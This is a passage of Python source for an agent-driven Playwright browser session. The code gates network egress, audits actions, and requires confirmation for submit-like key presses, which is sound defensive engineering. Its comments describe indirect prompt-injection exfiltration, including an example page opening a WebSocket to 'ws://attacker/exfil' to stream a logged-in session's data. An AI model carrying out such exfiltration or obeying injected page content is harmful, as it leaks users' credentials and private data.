"""BrowserSession — the agent-driven browser (ADR-0182 Pillar B).

An async Playwright-managed Chromium with a compliant action surface:
``navigate / observe / click / fill / fill_secret / read / scroll / back /
screenshot``. Every action routes through the compliance gates in
``compliance.py`` (egress allowlist, metadata-only audit, human-in-the-loop
confirmation for sensitive actions) and never lets a typed value reach the audit
trail or the model context.

Perception is Set-of-Marks (``marks.py``): each ``observe`` stamps interactive
elements with ``data-corvin-mark=<index>`` and returns the numbered list, so a
subsequent ``click(index)`` resolves back to the exact node without index drift.

The session is isolated: its own user-data dir + downloads dir under the tenant
browser home; nothing is shared with other sessions or the host profile.
"""
from __future__ import annotations

import asyncio
import base64
import contextlib
import logging
import sys as _sys  # only for the remedy message below (venv interpreter path)
from pathlib import Path
from typing import Any, Awaitable, Callable, Optional
from urllib.parse import urlparse

from . import compliance as _cmp
from .marks import (
    _ACTIVE_FORM_SENSITIVE_JS, _COLLECT_JS, _EXTRACT_FORMS_JS, _EXTRACT_TABLE_JS,
    _FINGERPRINT_JS, _FORM_SENSITIVE_JS, _PAINT_JS, _UNPAINT_JS,
    MAX_MARKS, Mark, Observation,
)

logger = logging.getLogger("corvin.browser.session")

# Type aliases for the injected compliance hooks.
AuditFn = Callable[..., None]
VaultResolve = Callable[[str], Optional[str]]           # vault_key -> secret value
ConfirmFn = Callable[..., Awaitable[bool]]              # (action, host, role, name) -> approved?
OnAction = Callable[[dict], None]                        # live action-log sink
OnFrame = Callable[[bytes], None]                        # screencast JPEG sink

# key() allowlist (ADR-0183 S2): only well-known, harmless navigation/editing
# keys may be pressed by name. Deliberately excludes modifier combinations
# (Ctrl/Alt/Meta/Shift+X) — those can trigger OS/browser-level shortcuts
# (devtools, paste-from-clipboard, "select all" on an unrelated field) that
# were never vetted for this action surface. Reject anything not on this list
# rather than passing an arbitrary string straight to Playwright's keyboard.
ALLOWED_KEYS = frozenset({
    "Enter", "Tab", "Escape", "Backspace", "Delete", "Space",
    "ArrowDown", "ArrowUp", "ArrowLeft", "ArrowRight",
    "Home", "End", "PageUp", "PageDown",
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12",
})

# Keys that can COMMIT the focused control — submit a form / activate a button —
# without any click() ever happening. A press of one of these must go through the
# SAME human-in-the-loop sensitivity gate + landing-egress recheck as a click,
# otherwise `fill(user); fill(pw); key("Enter")` would log in / pay / delete
# entirely un-confirmed (ADR-0183 S1 hardening — the "submit" sensitivity branch
# was previously dead code, reachable by nothing).
_COMMIT_KEYS = frozenset({"Enter", "Space"})

# Structured extraction bounds (ADR-0183 S2) — keep the model's context bounded
# regardless of how large the live page's table/forms are.
_MAX_EXTRACT_ROWS = 200

# Hard cap on concurrently-open tabs per session (review H3): a page that
# window.open()s in a loop must not spawn unbounded tabs + 30s guard tasks.
_MAX_TABS = 12


class BrowserActionError(RuntimeError):
    """Raised when an action cannot be completed (bad index, blocked, timeout)."""


# Actionable message for the one setup gap users actually hit: the browser
# isn't provisioned. The installer now does this (corvinOS/installer/steps/
# browser.py), but an install that predates that step, or a failed download,
# still lands here — so say exactly what to run instead of "not available".
# I1 (2026-07-20): the remedy must be a command that EXISTS on the canonical
# `uv tool install 'corvinos[browser]'` PATH — bare `playwright` / `pip` are
# "command not found" there; `corvin-install --browser` re-runs the
# provisioning step with the right interpreter on every install flavour.
_BROWSER_NOT_SET_UP = (
    "Browser automation isn't set up yet — the Chromium engine is missing. "
    "Run:  corvin-install --browser   "
    "(re-runs the browser provisioning step; a one-time ~150 MB download)."
)

# Distinct failure on minimal Linux images: Chromium IS downloaded but system
# libraries are missing. The Chromium download cannot fix this one — only the
# root-level dependency install can, so it needs its own message. Root's PATH
# has neither `playwright` nor this venv, so name the interpreter explicitly.
_BROWSER_MISSING_SYSTEM_DEPS = (
    "Chromium is installed but system libraries it needs are missing. "
    f'Run:  sudo "{_sys.executable}" -m playwright install-deps chromium   '
    "(one-time, needs root)."
)


def _looks_like_missing_system_deps(exc: BaseException) -> bool:
    """True iff *exc* is Playwright's 'host is missing dependencies' failure —
    Chromium downloaded fine but shared libraries are absent (minimal Linux)."""
    msg = str(exc).lower()
    return "missing dependencies" in msg or "install-deps" in msg


# 2026-08-02: distinct from both messages above. Chromium's own renderer
# sandbox setup code refuses outright to start when the launching process is
# root and --no-sandbox wasn't passed — installer/system_service_manager.py
# explicitly supports running the console as a root systemd service, so this
# is a real, reachable deploy shape, not a theoretical one. Before this fix
# the failure fell through to a bare `raise` (matched neither of the two
# checks above), got caught by browser.py's generic exception handler, and
# was flattened into "browser action failed — observe() the page and retry"
# — a retry can never succeed here since the launch fails identically every
# time, so the user just sees the browser "always crash".
_BROWSER_ROOT_NO_SANDBOX = (
    "Chromium refuses to start as root without disabling its sandbox. "
    "Either run the console as a non-root user (recommended), or set "
    "CORVIN_BROWSER_NO_SANDBOX=1 in its environment to accept the reduced "
    "renderer isolation and restart the service."
)


def _looks_like_root_no_sandbox(exc: BaseException) -> bool:
    """True iff *exc* is Chromium's 'running as root without --no-sandbox is
    not supported' launch failure."""
    msg = str(exc).lower()
    return "running as root" in msg and "--no-sandbox" in msg


def _find_chrome_binary() -> tuple[str, bool]:
    """Locate a real Google Chrome (or Chromium) executable for the attach launch
    command. Returns (path_or_name, found). Probes the actual per-OS install
    locations — incl. per-user Windows installs and the several Linux binary
    names — instead of hardcoding one guess that dead-ends the attach flow when
    Chrome lives elsewhere (review F6/M5)."""
    import os as _os
    import shutil as _shutil
    import sys as _sys
    if _sys.platform == "darwin":
        cands = [
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
            _os.path.expanduser("~/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"),
            "/Applications/Chromium.app/Contents/MacOS/Chromium",
        ]
    elif _sys.platform.startswith("win"):
        pf = _os.environ.get("ProgramFiles", r"C:\Program Files")
        pf86 = _os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)")
        local = _os.environ.get("LOCALAPPDATA", "")
        cands = [
            rf"{pf}\Google\Chrome\Application\chrome.exe",
            rf"{pf86}\Google\Chrome\Application\chrome.exe",
            (rf"{local}\Google\Chrome\Application\chrome.exe" if local else ""),
        ]
    else:
        # Prefer an on-PATH binary; fall back to common absolute locations.
        for name in ("google-chrome", "google-chrome-stable", "chromium",
                     "chromium-browser"):
            hit = _shutil.which(name)
            if hit:
                return hit, True
        cands = ["/opt/google/chrome/chrome", "/usr/bin/chromium",
                 "/usr/bin/chromium-browser", "/snap/bin/chromium"]
    for c in cands:
        if c and _os.path.exists(c):
            return c, True
    # Nothing found: return a sensible per-OS default name so the command is
    # still copy-pasteable (Chrome may be on PATH under a name we didn't probe).
    if _sys.platform == "darwin":
        return "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", False
    if _sys.platform.startswith("win"):
        return r"C:\Program Files\Google\Chrome\Application\chrome.exe", False
    return "google-chrome", False


def _default_automation_profile() -> str:
    """A stable, per-user automation-profile dir for attach mode — never the
    user's real Chrome profile. Filled into the launch command so the user does
    not have to invent a path (review M5: the old command emitted a literal
    <automation-profile-dir> placeholder that copy-paste turned into a directory
    of that literal name)."""
    import os as _os
    import sys as _sys
    if _sys.platform.startswith("win"):
        base = _os.environ.get("LOCALAPPDATA") or _os.path.expanduser("~")
        return _os.path.join(base, "CorvinOS", "chrome-automation-profile")
    return _os.path.expanduser("~/.corvin/chrome-automation-profile")


def cdp_launch_command(port: int = 9222, profile_dir: str | None = None) -> str:
    """The exact command the user runs to start a debug Chrome for attach mode
    (ADR-0200 Q4: CorvinOS never auto-launches it — the user does, explicitly).

    A DEDICATED automation profile (Q1) is mandatory, not cosmetic: Chrome 136+
    refuses --remote-debugging-port on the default profile, and a separate
    profile is the user-visible trust boundary the ADR rests on. The command is
    emitted in a shell-correct form per OS — on Windows PowerShell (the default
    shell) a bare quoted path is only ECHOED, so it needs the `& ` call operator.
    """
    import sys as _sys
    chrome, _found = _find_chrome_binary()
    prof = profile_dir or _default_automation_profile()
    if _sys.platform.startswith("win"):
        # PowerShell: `& "C:\...\chrome.exe" --flags` actually executes.
        return (f'& "{chrome}" --remote-debugging-port={port} '
                f'--user-data-dir="{prof}"')
    # POSIX shells: quote the path (it may contain spaces on macOS).
    return (f'"{chrome}" --remote-debugging-port={port} '
            f'--user-data-dir="{prof}"')


def _looks_like_missing_browser(exc: BaseException) -> bool:
    """True iff *exc* is Playwright's 'browser binary not installed' failure.

    Playwright raises a generic Error whose message names the missing executable
    and points at `playwright install` — matched on the stable phrases rather
    than an exception type, since the driver surfaces it as a plain Error.
    The missing-system-deps failure ALSO mentions `playwright install` (as
    `install-deps`), so that shape must be excluded here or the user gets told
    to re-download a browser they already have."""
    if _looks_like_missing_system_deps(exc):
        return False
    msg = str(exc).lower()
    return (
        ("executable doesn't exist" in msg or "executabledoesn'texist" in msg
         or ("browser" in msg and "was not found" in msg))
        or "playwright install" in msg
    )


# ── Chrome-primary / Chromium-fallback launch engine selection (ADR-0182) ─────
# The launched (non-attach) session prefers the user's real Google Chrome
# (Playwright `channel="chrome"`) for the best real-site compatibility and the
# "real browser" feel, and falls back to Playwright's bundled Chromium — the
# version guaranteed to be present after `playwright install chromium` — when
# Chrome isn't installed or won't start. Override with CORVIN_BROWSER_CHANNEL:
#   auto      (default) → try Chrome, fall back to bundled Chromium
#   chrome / chrome-beta / chrome-dev / msedge / msedge-beta / msedge-dev
#             → that branded channel ONLY, no silent fallback
#   chromium / bundled  → the bundled Chromium ONLY
_EXPLICIT_CHANNELS = frozenset({
    "chrome", "chrome-beta", "chrome-dev", "chrome-canary",
    "msedge", "msedge-beta", "msedge-dev",
})

# Sentinel + process-wide cache: once auto mode has learned which engine actually
# launches on THIS host, every later session skips the (stable, non-transient)
# failed-Chrome attempt — so a headless server with no Google Chrome does not pay
# a failed-launch round-trip on every single session. None ⇒ bundled Chromium.
_UNSET: Any = object()
_auto_channel_cache: Any = _UNSET


def _channel_pref() -> str:
    import os
    return (os.environ.get("CORVIN_BROWSER_CHANNEL") or "auto").strip().lower()


def _channel_candidates() -> list[str | None]:
    """Ordered launch engines to try. In auto mode: real Chrome first, bundled
    Chromium as the fallback (or the cached winner once learned)."""
    pref = _channel_pref()
    if pref in _EXPLICIT_CHANNELS:
        return [pref]
    if pref in ("chromium", "bundled"):
        return [None]
    if _auto_channel_cache is not _UNSET:
        return [_auto_channel_cache]
    return ["chrome", None]


def _remember_channel(channel: str | None) -> None:
    """Cache the engine that actually launched, so auto mode is sticky for the
    life of the process. Only auto mode caches — an explicit override is never
    second-guessed."""
    global _auto_channel_cache
    pref = _channel_pref()
    if pref not in _EXPLICIT_CHANNELS and pref not in ("chromium", "bundled"):
        _auto_channel_cache = channel


class StaleMarkError(BrowserActionError):
    """Raised when the live element at ``[index]`` no longer matches the
    ``Mark`` captured at the last ``observe()`` (ADR-0183 S1 stale-mark
    self-healing) — an in-place SPA re-render changed the element under the
    index between observe() and the act. Distinguishable from the plain
    "mark not found" case (element removed entirely) so a caller (e.g. the
    agent loop) can specifically prompt a re-observe instead of retrying
    blindly or surfacing a generic error."""


def _safe_tab_url(url: str) -> str:
    """scheme://host/path with the query string + fragment stripped — a URL fit
    to hand back to the model / live-view without leaking a ?token=/reset secret
    carried in the query. Falls back to the bare host on any parse trouble."""
    try:
        u = urlparse(url or "")
        if not u.scheme or not u.hostname:
            return (u.hostname or "").lower()
        # Build netloc from host(+port) ONLY — never u.netloc, which would carry
        # any user:password@ userinfo through verbatim.
        netloc = u.hostname.lower()
        if u.port:
            netloc = f"{netloc}:{u.port}"
        return f"{u.scheme}://{netloc}{u.path}"
    except Exception:  # noqa: BLE001
        return ""


def _host_task_scoped(host: str, task_hosts: list[str]) -> bool:
    """ADR-0189: True if `host` is one of the hosts the user's own task text
    named, or a SUBDOMAIN of one (task said "example.com", a login/OAuth
    redirect lands on "accounts.example.com" or "www.example.com").

    Deliberately one-directional and narrower than "same registrable
    domain" — that needs a public-suffix-list dependency to do correctly
    (co.uk-style multi-part TLDs) and getting it wrong in the permissive
    direction would silently widen the auto-approved surface. In
    particular this must NOT also trust the bare PARENT of a task-named
    subdomain (task said "sub.example.com" -> do NOT auto-approve
    "example.com"): on shared apex hosting (*.vercel.app, *.s3.amazonaws.com,
    *.github.io, ...) the apex the user never named can be someone else's
    content entirely, so that direction would auto-approve a host the human
    never typed. A sibling subdomain that isn't a subdomain of a named task
    host still requires the normal confirm — the safe failure direction."""
    host = host.lower().rstrip(".")
    for th in task_hosts:
        th = (th or "").lower().rstrip(".")
        if not th:
            continue
        if host == th or host.endswith("." + th):
            return True
    return False


class BrowserSession:
    def __init__(
        self,
        session_id: str,
        tenant_id: str,
        *,
        home: Path,
        allowlist: list[str] | None = None,
        forbidden: list[str] | None = None,
        task_scoped_hosts: list[str] | None = None,
        audit_fn: AuditFn | None = None,
        vault_resolve: VaultResolve | None = None,
        confirm_fn: ConfirmFn | None = None,
        on_action: OnAction | None = None,
        headless: bool = True,
        nav_timeout_ms: int = 30_000,
        cdp_endpoint: str | None = None,
        consent_ok: "Callable[[], bool] | None" = None,
    ) -> None:
        self.session_id = session_id
        self.tenant_id = tenant_id
        self._home = home
        self._allowlist = allowlist
        self._forbidden = forbidden
        # ADR-0189: ephemeral, per-session hosts extracted from the user's own
        # task text — never persisted, never merged into self._allowlist (that
        # field's mere presence disables the cross-host confirm entirely, see
        # navigate() below; task_scoped_hosts must NOT have that side effect).
        self._task_scoped_hosts = task_scoped_hosts
        self._audit = audit_fn
        self._vault = vault_resolve
        self._confirm = confirm_fn
        self._on_action = on_action
        self._headless = headless
        self._nav_timeout = nav_timeout_ms
        # ADR-0200: when set, this session ATTACHES to the user's real Chrome
        # (connect_over_cdp) instead of launching its own empty Chromium. Detach
        # (close) must then never close the user's context/tabs nor wipe a
        # profile — see close(). None = the original launch-own-Chromium mode.
        self._cdp_endpoint = cdp_endpoint
        self._attached = cdp_endpoint is not None
        # Re-checked on EVERY action for attached sessions (review finding) so an
        # expired/revoked real-chrome consent stops a live session, not just new ones.
        self._consent_ok = consent_ok
        # Audit tag stamped on every action so a reviewer can tell real-login
        # (attach) actions apart from sandboxed ones (ADR-0200).
        self._attach_tag = "real-chrome" if self._attached else ""

        self._pw = None
        self._browser = None
        self._context = None
        self._page = None
        self._last_marks: list[Mark] = []
        # ADR-0183 S2 iframe traversal: which Frame (or Page, for the main
        # document) a given global mark index was collected from, so
        # ``_resolve()`` queries the CORRECT frame instead of always the
        # top-level page. Absent entries default to the current page (fully
        # backward compatible with pre-S2 single-frame pages).
        self._mark_frame: dict[int, Any] = {}
        self._screencast_task: asyncio.Task | None = None
        self.paused = False          # take-over: agent actions are refused while paused
        # Playwright Page is NOT safe for concurrent operations. This lock
        # serializes every page-touching call (actions AND the screencast poll)
        # so a screenshot can never interleave with a click/navigate. Public
        # methods acquire it; internal helpers (``*_locked``) assume it is held to
        # avoid re-entrant deadlock (navigate → observe).
        self._page_lock = asyncio.Lock()
        # Lazy-start: Chromium is not launched at construction time — only when the
        # first action (typically navigate) is called.  _pending_on_frame is set by
        # the manager and consumed by _ensure_started() to wire the screencast after
        # the browser is up.
        self._start_lock = asyncio.Lock()
        self._pending_on_frame: "OnFrame | None" = None
        # Terminal-state flag (concurrency review H1): close() sets it FIRST so a
        # concurrent in-flight action cannot re-launch Chromium after teardown
        # (close() nulls _pw/_context, which _ensure_started would otherwise read
        # as "never started" and relaunch → a leaked, unreachable zombie browser).
        self._closed = False
        # Set by a browser/context disconnect event (review F3): the launched
        # Chromium crashed (OOM), or in attach mode the user quit their real
        # Chrome / closed the debug port. Once set, every action fails fast with
        # an ACTIONABLE message ("the browser was closed — start a new session")
        # instead of a raw Playwright 'Target closed' that the route turns into an
        # opaque 500 and the live view freezes on the last frame forever.
        self._disconnected = False
        # Fire-and-forget new-tab egress guards (review H3): the event loop keeps
        # only a WEAK ref to a bare ensure_future task, so it can be GC'd mid-wait
        # and silently skip the egress check (fail-closed → fail-open). Keep a hard
        # ref here; cancel them all on close().
        self._guard_tasks: set[asyncio.Task] = set()

    # ── lifecycle ────────────────────────────────────────────────────────────
    async def _ensure_started(self) -> None:
        """Lazily launch Chromium on the first action — double-checked lock."""
        if self._closed:
            raise BrowserActionError("session closed")
        # Fast path requires a live PAGE too (review M4): a persistent context can
        # briefly exist with _pw/_context set but _page still None during start(),
        # and the invariant "fast path ⇒ fully usable" must hold.
        if self._pw is not None and self._context is not None and self._page is not None:
            return
        async with self._start_lock:
            if self._closed:
                raise BrowserActionError("session closed")
            if self._pw is None or self._context is None or self._page is None:
                await self.start()
                if self._pending_on_frame is not None:
                    await self.start_screencast(self._pending_on_frame)
                    self._pending_on_frame = None

    async def _abort_start(self) -> None:
        """Fully unwind a partial start (review: partial-start fail-open / driver
        leak). ANY failure after ``_pw`` is set — including a failure INSIDE
        ``_finish_start`` (e.g. context.route() on a browser that died mid-start)
        — must leave NO refs set and NO driver subprocess leaked; otherwise the
        next ``_ensure_started`` either treats a half-built session as usable
        (running WITHOUT the per-request egress route / WS gate / new-tab guard —
        fail-OPEN on a security control) or re-enters start() and overwrites
        ``_pw`` without stopping the old driver (leaked Chromium holding the
        profile lock → every relaunch wedges on 'profile in use'). Never closes
        the USER's real Chrome in attach mode — only disconnects the CDP link."""
        with contextlib.suppress(Exception):
            if self._attached:
                if self._browser is not None:
                    await self._browser.close()   # disconnect CDP, don't kill their Chrome
            elif self._context is not None:
                await self._context.close()
        with contextlib.suppress(Exception):
            if self._pw is not None:
                await self._pw.stop()
        self._pw = self._browser = self._context = self._page = None

    async def start(self) -> None:
        import os
        try:
            from playwright.async_api import async_playwright
        except ModuleNotFoundError as exc:
            # The `playwright` package itself isn't installed (a base
            # `pip install corvinos` — playwright is the `[browser]` extra).
            # Raise the ACTIONABLE message instead of a bare ModuleNotFoundError
            # that the route turns into an opaque 500 and the model narrates as
            # "der Browser-Dienst ist nicht verfügbar".
            raise BrowserActionError(_BROWSER_NOT_SET_UP) from exc
        # Defensive against a re-entrant start() after a partial failure that left
        # a driver behind: never overwrite a live _pw without stopping it first.
        # getattr, not attribute access — start() may run on a partially built
        # object (some tests construct via __new__).
        _existing_pw = getattr(self, "_pw", None)
        if _existing_pw is not None:
            with contextlib.suppress(Exception):
                await _existing_pw.stop()
        self._pw = await async_playwright().start()

        # ADR-0200 attach mode: drive the user's REAL, logged-in Chrome via CDP
        # instead of launching our own empty Chromium. The user starts Chrome
        # with --remote-debugging-port + a dedicated automation profile (Q1/Q4),
        # logs in, and we connect_over_cdp to it. Everything downstream of
        # self._context/_page — navigate, observe, act, egress checks, audit,
        # confirm — is IDENTICAL to the launched-browser path; only how the
        # context is obtained differs.
        if self._attached:
            try:
                self._browser = await self._pw.chromium.connect_over_cdp(
                    self._cdp_endpoint, timeout=self._nav_timeout)
            except Exception as exc:
                await self._abort_start()
                raise BrowserActionError(
                    "Could not attach to your Chrome. Start it with the command "
                    "from the console (chrome --remote-debugging-port=… "
                    "--user-data-dir=<automation profile>), then retry."
                ) from exc
            try:
                # Reuse the context/page the user already has open; never open a
                # blank one behind their back. new_context() would create a fresh,
                # login-less context — the exact opposite of what attach is for —
                # so prefer an EXISTING context (their logged-in one).
                self._context = (self._browser.contexts[0]
                                 if self._browser.contexts
                                 else await self._browser.new_context())
                self._page = (self._context.pages[0] if self._context.pages
                              else await self._context.new_page())
                # SAME page setup + multi-tab guard + per-request egress route as
                # the launched path — the user's real browser is gated identically.
                await self._finish_start()
            except Exception as exc:
                # A failure wiring the egress guards must NOT leave a half-built,
                # gate-less attached session usable. Disconnect + null everything.
                await self._abort_start()
                raise BrowserActionError(
                    "Attached to your Chrome but could not finish securing the "
                    "session — it may have closed mid-attach. Retry.") from exc
            return

        user_data = self._home / "sessions" / self.session_id
        user_data.mkdir(parents=True, exist_ok=True)
        self._user_data = user_data
        # Renderer sandbox stays ON — this browser loads untrusted third-party
        # pages, so a renderer exploit must NOT reach the host. Only disable it
        # when the deploy environment genuinely can't sandbox (e.g. unprivileged
        # container as root) via an explicit opt-in, and log the downgrade.
        args = ["--disable-dev-shm-usage"]
        if os.environ.get("CORVIN_BROWSER_NO_SANDBOX") == "1":
            args.append("--no-sandbox")
            logger.warning("browser: renderer sandbox DISABLED (CORVIN_BROWSER_NO_SANDBOX=1)")

        # Chrome-primary, Chromium-fallback: try the user's real Google Chrome
        # first (best real-site compatibility + real-browser feel), then fall
        # back to the bundled Chromium that `playwright install chromium`
        # guarantees. In auto mode ANY Chrome-launch failure (not installed,
        # version mismatch, won't start) transparently falls through to the
        # fallback — only the LAST candidate's failure surfaces to the user, so a
        # host without Chrome still "just works" on Chromium.
        candidates = _channel_candidates()
        self._context = None
        for i, channel in enumerate(candidates):
            is_last = i == len(candidates) - 1
            try:
                self._context = await self._pw.chromium.launch_persistent_context(
                    user_data_dir=str(user_data),
                    channel=channel,            # None → bundled Chromium; "chrome" → system Google Chrome
                    headless=self._headless,
                    accept_downloads=False,     # downloads gated separately (L10) — off by default
                    args=args,
                    viewport={"width": 1280, "height": 800},
                )
            except Exception as exc:
                if not is_last:
                    # A preferred branded channel failed — fall back to the next
                    # candidate (bundled Chromium). Not user-facing: the fallback
                    # is the whole point.
                    logger.info(
                        "browser: launch via channel=%r failed (%s); trying fallback",
                        channel or "chromium", type(exc).__name__)
                    continue
                # The last candidate failed — this IS terminal. A failed launch
                # must not leak the Playwright driver subprocess nor leave _pw
                # truthy — that would make _ensure_started() think the session is
                # already up on the next call, permanently wedging it.
                with contextlib.suppress(Exception):
                    await self._pw.stop()
                self._pw = None
                # The dominant real cause is the Chromium BINARY not being
                # downloaded (playwright installed, `playwright install chromium`
                # never run): Playwright raises "Executable doesn't exist at
                # …/chromium-XXXX/…". Translate that into the actionable message
                # so the user learns they need to fetch the browser, instead of
                # the opaque "not available".
                if _looks_like_root_no_sandbox(exc):
                    raise BrowserActionError(_BROWSER_ROOT_NO_SANDBOX) from exc
                if _looks_like_missing_system_deps(exc):
                    raise BrowserActionError(_BROWSER_MISSING_SYSTEM_DEPS) from exc
                if _looks_like_missing_browser(exc):
                    raise BrowserActionError(_BROWSER_NOT_SET_UP) from exc
                raise
            else:
                # Remember what actually launched so later sessions in auto mode
                # skip the (stable) failed-Chrome attempt.
                _remember_channel(channel)
                if channel:
                    logger.info("browser: launched via '%s'", channel)
                break
        try:
            self._page = (self._context.pages[0] if self._context.pages
                          else await self._context.new_page())
            await self._finish_start()
        except Exception as exc:
            # Same partial-start hardening as the attach path: a failure wiring
            # the egress guards must tear the half-built session down completely
            # (stop the driver, null refs) rather than leave it fail-open or leak
            # a Chromium holding the profile lock.
            await self._abort_start()
            raise BrowserActionError(
                "Browser launched but could not finish securing the session — "
                "retry.") from exc

    async def _finish_start(self) -> None:
        """Page setup + guards shared by the launched and CDP-attached paths.

        Whichever way self._context/_page were obtained, EVERY tab must get the
        multi-tab egress guard and the per-request egress route — the user's real
        browser is not exempt from either.
        """
        self._page.set_default_timeout(self._nav_timeout)
        # Disconnect detection (review F3): mark the session dead the moment the
        # browser process goes away — a launched Chromium crash, or in attach mode
        # the user quitting their real Chrome — so the next action fails fast with
        # an actionable message and the screencast loop stops, instead of the live
        # view freezing and every action raising a raw 'Target closed' → 500.
        self._context.on("close", lambda *_: self._mark_disconnected())
        if self._browser is not None:
            self._browser.on("disconnected", lambda *_: self._mark_disconnected())
        # Multi-tab awareness (ADR-0183 S2): a target="_blank" click or a
        # window.open() creates a brand-new Page OUTSIDE the normal
        # navigate()/click() control flow — without this hook it could reach
        # an off-allowlist host without ever going through check_egress().
        # Wired once, at the context level, so it covers every tab for the
        # life of the session.
        self._context.on("page", self._on_new_page)
        # Network-layer egress enforcement (review HIGH-1). check_egress() gates
        # top-level NAVIGATION, but a loaded page can still fetch()/XHR/beacon/
        # <img> to ANY host — the real indirect-prompt-injection exfil vector.
        # Route EVERY request through the same policy and abort a disallowed one.
        # This also blocks a subresource fetch to a cloud-metadata endpoint even
        # when no allowlist is configured (check_egress blocks metadata always).
        await self._context.route("**/*", self._route_egress)
        # context.route("**/*") does NOT intercept WebSocket handshakes (proven
        # by adversarial review: a page can new WebSocket('ws://attacker/exfil')
        # and stream a real logged-in session's data out with check_egress never
        # running). Gate WS separately — worst-case in attach mode where the tab
        # holds real credentials. Best-effort: an old Playwright without
        # route_web_socket logs and leaves HTTP gating in place.
        try:
            await self._context.route_web_socket("**/*", self._route_web_socket)
        except AttributeError:  # pragma: no cover — Playwright < 1.48
            logger.warning("browser: route_web_socket unavailable — WS egress ungated")

    def _route_web_socket(self, ws) -> None:
        """Per-WebSocket egress gate. Allowed → proxy to the real server;
        disallowed (off-allowlist, private/metadata, forbidden) → close. Same
        policy as _route_egress. Fail-closed: any error closes the socket."""
        try:
            # B2 (adversarial review 2026-07-20): check_egress hard-rejects the
            # ws/wss scheme, so the gate closed EVERY WebSocket — including
            # allowlisted hosts — and the 'Allowed → proxy' path above was
            # unreachable. Map ws→http / wss→https for the CHECK only: all
            # host/IP/private/forbidden logic runs identically; any other
            # scheme still fails the check_egress scheme gate (fail-closed).
            check_url = ws.url
            if check_url.startswith("wss://"):
                check_url = "https://" + check_url[len("wss://"):]
            elif check_url.startswith("ws://"):
                check_url = "http://" + check_url[len("ws://"):]
            if _cmp.check_egress(check_url, allowlist=self._allowlist,
                                 forbidden=self._forbidden).allowed:
                ws.connect_to_server()
            else:
                ws.close()
        except Exception:  # noqa: BLE001 — fail-closed on this one socket
            with contextlib.suppress(Exception):
                ws.close()

    async def _route_egress(self, route) -> None:
        """Per-request egress gate. In-page pseudo-schemes (data:/blob:/about:)
        make no network egress and are always allowed; everything else must pass
        check_egress or is aborted. Fail-closed: any handler error aborts the
        single request rather than letting it through."""
        try:
            url = route.request.url
            scheme = (urlparse(url).scheme or "").lower()
            if scheme in ("data", "blob", "about", "javascript", "filesystem"):
                await route.continue_()
                return
            if _cmp.check_egress(url, allowlist=self._allowlist,
                                 forbidden=self._forbidden).allowed:
                await route.continue_()
            else:
                await route.abort()
        except Exception:  # noqa: BLE001 — fail-closed on this one request
            with contextlib.suppress(Exception):
                await route.abort()

    def _on_new_page(self, new_page) -> None:
        """Sync 'page' event callback (Playwright fires this synchronously) —
        just schedules the actual async egress check/audit. Keep a HARD ref to
        the task (review H3) so the loop's weak-ref bookkeeping can't GC it
        mid-wait and silently skip the guard."""
        task = asyncio.ensure_future(self._guard_new_page(new_page))
        self._guard_tasks.add(task)
        task.add_done_callback(self._guard_tasks.discard)

    async def _guard_new_page(self, new_page) -> None:
        """Fail-closed egress gate for a newly-opened tab/popup.

        Best-effort: waits for the tab's first load so ``new_page.url``
        reflects its real destination (covers the common target="_blank" /
        window.open(url) case); a script that opens a blank tab and navigates
        it later via a timer is a known limitation of this one-shot check —
        the same fail-closed re-check that ``navigate()``/``click()`` already
        do for the PRIMARY tab does not yet run repeatedly on secondary tabs.
        Any error here (including the egress check itself) closes the tab
        rather than leaving an unchecked page open.
        """
        host = ""
        try:
            # Tab-flood cap (review H3): a page that window.open()s in a loop must
            # not spawn unbounded tabs+guards. Over the cap, close the newcomer.
            # ATTACH-MODE CARVE-OUT (review CRITICAL): in attach mode the pages
            # list is the user's OWN Chrome — tabs THEY opened count toward
            # len(pages), and closing "the newcomer" would slam shut a tab the
            # user just opened themselves. ADR-0200's invariant is absolute: never
            # close their tabs. So on an attached session, only audit/emit the
            # over-cap condition; never close.
            if self._context is not None and len(self._context.pages) > _MAX_TABS:
                if not self._attached:
                    await self._safe_close_tab(new_page)
                self._emit("new_tab", host="", ok=False,
                           reason="tab_limit" if not self._attached else "tab_limit_attach_noclose")
                return
            with contextlib.suppress(Exception):
                await new_page.wait_for_load_state("load", timeout=self._nav_timeout)
            new_page.set_default_timeout(self._nav_timeout)
            url = new_page.url
            decision = _cmp.check_egress(url, allowlist=self._allowlist, forbidden=self._forbidden)
            host = decision.host
            if not decision.allowed and url not in ("about:blank", ""):
                # Attach mode (review finding): the tab may be one the USER opened
                # in their OWN Chrome (their router, a localhost dev server). We
                # must NOT close their tabs. The request-level route + WS gate
                # already block its actual network egress, so audit the off-policy
                # tab but leave it open; only the launched managed browser (whose
                # every tab is agent-driven) auto-closes it.
                if not self._attached:
                    await self._safe_close_tab(new_page)
                _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                                  action="new_tab", host=host, ok=False,
                                  extra={"reason": decision.reason,
                                         "closed": (not self._attached)})
                self._emit("new_tab", host=host, ok=False, reason=decision.reason)
                return
            _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                              action="new_tab", host=host, ok=True)
            self._emit("new_tab", host=host, ok=True)
        except Exception:  # noqa: BLE001 — a hook failure must never crash the session;
            # fail-closed: an unexpected error means we could NOT confirm the new
            # tab is safe, so close it rather than leave it open unchecked —
            # EXCEPT in attach mode, where the tab may be the user's own and the
            # ADR-0200 invariant forbids closing their tabs even on our error.
            # The per-request egress route + WS gate still block its actual
            # network egress; here we only decline to auto-close.
            if not self._attached:
                await self._safe_close_tab(new_page)
            logger.debug("new-tab egress guard failed for %s (attached=%s)", host, self._attached, exc_info=True)

    async def _safe_close_tab(self, page) -> None:
        """Close a popup/secondary tab under the page lock (review M2: the guard
        must not race an in-flight locked action on the same Page). NEVER closes
        the tab that is currently the active ``self._page`` — switch_tab() may
        have promoted this popup to primary while we were waiting for its load;
        closing it would leave every later action raising a raw 'Target closed'.
        """
        if page is self._page:
            return
        async with self._page_lock:
            if page is self._page:      # re-check under the lock
                return
            with contextlib.suppress(Exception):
                await page.close()

    async def close(self) -> None:
        """Idempotent, self-serializing teardown (review H1/H3/H4/M3).

